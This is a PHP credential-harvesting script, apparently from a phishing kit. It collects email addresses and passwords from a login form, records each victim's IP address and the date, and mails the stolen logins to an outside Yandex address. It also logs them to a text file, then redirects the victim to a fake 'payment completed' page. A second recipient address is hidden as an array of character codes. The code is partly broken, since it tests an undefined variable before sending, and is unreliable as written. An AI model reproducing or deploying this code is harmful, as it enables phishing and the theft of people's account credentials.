<?
session_start();
error_reporting(0);
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "---------=Access 2=---------\n";
$a=$_POST['email'];
$b=$_POST['pass'];
$message .= "Email : ".$a."\n";
$message .= "Pass: ".$b."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------= BY Mr S!CKICK =---------\n";
$sent ="dryamix@yandex.com";
$subject = "Mail Access -Error ".$ip;
$headers = "From: Ma_Thexab<sickick@spreadthesickness.com>";
$headers = "MIME-Version: 1.0\n";
if (!empty($c)) {
mail($sent,$subject,$message,$headers);

//Txt delivering 
$fp = fopen("result.txt","a");
fputs($fp,$message);

} else {  
    echo "No, mail is not set";
}
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: paymentcompleted.html");
?>